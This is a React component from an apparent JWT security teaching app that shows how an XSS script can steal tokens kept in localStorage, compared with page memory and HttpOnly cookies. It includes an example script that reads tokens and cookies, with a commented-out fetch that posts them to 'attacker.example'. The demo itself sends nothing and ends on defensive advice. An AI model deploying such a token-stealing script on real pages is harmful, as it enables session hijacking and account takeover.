import { useState } from "react";
import { api } from "../lib/api.js";
import StatusBadge from "./StatusBadge.jsx";

const LS_KEY = "jwtlab_access_token";

function readLocalStorage() {
  try {
    return window.localStorage.getItem(LS_KEY);
  } catch {
    return null;
  }
}

const SCRIPT = `// A script injected into the page (XSS) tries every place a token could be:
const stolen = {
  fromLocalStorage: localStorage.getItem("${LS_KEY}"),
  fromCookies: document.cookie,
  fromGlobals: window.accessToken ?? window.token ?? null,
};
// ...and would then send it to the attacker:
// fetch("https://attacker.example/steal", { method: "POST", body: JSON.stringify(stolen) });`;

function short(token) {
  return token ? `${token.slice(0, 24)}…` : "";
}

export default function StorageDemo({ tokens, creds }) {
  const [inLocal, setInLocal] = useState(() => Boolean(readLocalStorage()));
  const [sessionStatus, setSessionStatus] = useState(null);
  const [loot, setLoot] = useState(null);
  const [replay, setReplay] = useState(null);
  const [storageError, setStorageError] = useState(null);

  function saveToLocalStorage() {
    try {
      window.localStorage.setItem(LS_KEY, tokens.access);
      setInLocal(true);
      setStorageError(null);
    } catch {
      setStorageError("This browser blocked localStorage (private mode?), so this part of the demo can't run here.");
    }
  }

  function clearLocalStorage() {
    try {
      window.localStorage.removeItem(LS_KEY);
    } catch {
      /* nothing stored */
    }
    setInLocal(false);
    setLoot(null);
    setReplay(null);
  }

  async function getSessionCookie() {
    const res = await api("/api/session/login/", { method: "POST", body: creds, label: "Session login (for cookie)" });
    setSessionStatus(res.status);
  }

  function runMaliciousScript() {
    // The same three reads as the script shown above. Nothing is sent anywhere.
    const stolen = {
      fromLocalStorage: readLocalStorage(),
      fromCookies: document.cookie,
      fromGlobals: window.accessToken ?? window.token ?? null,
    };
    setLoot(stolen);
    setReplay(null);
  }

  async function useStolenToken() {
    const res = await api("/api/dogs/breeds/?limit=1", {
      token: loot.fromLocalStorage,
      label: "Attacker uses the stolen token",
    });
    setReplay(res.status);
  }

  const memoryHolds = Boolean(tokens);
  const cookieNames = loot ? loot.fromCookies.split(";").map((c) => c.split("=")[0].trim()).filter(Boolean) : [];

  return (
    <div className="panel">
      <p className="step-intro">
        Put a credential in each place, then run a simulated malicious script that reads whatever JavaScript can
        reach. Nothing leaves your browser.
      </p>

      <div className="stores">
        <div className={`store ${loot ? (loot.fromLocalStorage ? "stolen" : "safe") : ""}`}>
          <h3>localStorage</h3>
          <p>Saved by JavaScript; survives reloads.</p>
          <p className="store-state">{inLocal ? "Holds your access token" : "Empty"}</p>
          <div className="row">
            <button className="btn btn-small" onClick={saveToLocalStorage} disabled={!tokens}>
              Save token here
            </button>
            {inLocal && (
              <button className="btn btn-small btn-quiet" onClick={clearLocalStorage}>
                Clear
              </button>
            )}
          </div>
          {!tokens && <p className="muted small">Log in first.</p>}
          {loot && (
            <p className="store-verdict">
              {loot.fromLocalStorage ? `Stolen: ${short(loot.fromLocalStorage)}` : "Nothing here to steal"}
            </p>
          )}
        </div>

        <div className={`store ${loot ? "safe" : ""}`}>
          <h3>Page memory</h3>
          <p>Held inside the React app's state. This is what JWT Lab uses.</p>
          <p className="store-state">{memoryHolds ? "Holds your access and refresh tokens" : "Empty (not logged in)"}</p>
          {loot && (
            <p className="store-verdict">
              {loot.fromGlobals ? "Found in a global variable" : "Not found: not in storage or any global variable"}
            </p>
          )}
        </div>

        <div className={`store ${loot ? (cookieNames.includes("sessionid") ? "stolen" : "safe") : ""}`}>
          <h3>HttpOnly cookie</h3>
          <p>Set by the server for session login; the browser hides it from scripts.</p>
          <p className="store-state">
            {sessionStatus === 200 ? "Holds a session ID" : "No session cookie yet"}
          </p>
          <div className="row">
            <button className="btn btn-small" onClick={getSessionCookie}>
              Get a session cookie
            </button>
            {sessionStatus !== null && <StatusBadge status={sessionStatus} />}
          </div>
          {loot && (
            <p className="store-verdict">
              {cookieNames.includes("sessionid")
                ? "Session ID readable"
                : `Not readable. Scripts see only: ${cookieNames.length ? cookieNames.join(", ") : "no cookies"}`}
            </p>
          )}
        </div>
      </div>

      {storageError && <p className="notice notice-warn">{storageError}</p>}

      <div className="script">
        <div className="row between">
          <h3>The malicious script</h3>
          <button className="btn btn-danger" onClick={runMaliciousScript}>
            Run the malicious script
          </button>
        </div>
        <pre>
          <code>{SCRIPT}</code>
        </pre>
      </div>

      {loot?.fromLocalStorage && (
        <div className="notice notice-bad">
          <p className="tight">
            The token in localStorage was stolen. A JWT is a bearer token: whoever holds it can use it from any
            computer until it expires.
          </p>
          <div className="row">
            <button className="btn btn-small" onClick={useStolenToken}>
              Use the stolen token as the attacker
            </button>
            {replay !== null && <StatusBadge status={replay} />}
            {replay === 200 && <span className="small">The attacker got the dog data.</span>}
          </div>
        </div>
      )}

      <div className="table-wrap">
        <table className="compare-table">
          <caption>Where each credential can live, and its risks</caption>
          <thead>
            <tr>
              <th scope="col">Place</th>
              <th scope="col">Can an XSS script read it?</th>
              <th scope="col">Sent automatically (CSRF risk)?</th>
              <th scope="col">Survives a reload?</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <th scope="row">JWT in localStorage</th>
              <td className="bad">Yes, and it can be used anywhere</td>
              <td className="good">No</td>
              <td>Yes</td>
            </tr>
            <tr>
              <th scope="row">JWT in page memory</th>
              <td className="good">Not directly</td>
              <td className="good">No</td>
              <td>No, you log in again</td>
            </tr>
            <tr>
              <th scope="row">Session ID in an HttpOnly cookie</th>
              <td className="good">No</td>
              <td className="bad">Yes, so a CSRF token is required</td>
              <td>Yes</td>
            </tr>
          </tbody>
        </table>
      </div>

      <p className="caveat">
        Memory and HttpOnly cookies stop a script from carrying the credential away, but a script running in your
        open page can still send requests as you. The real defence against XSS is never letting attacker code into
        the page: escape user content and use a Content-Security-Policy.
      </p>
    </div>
  );
}
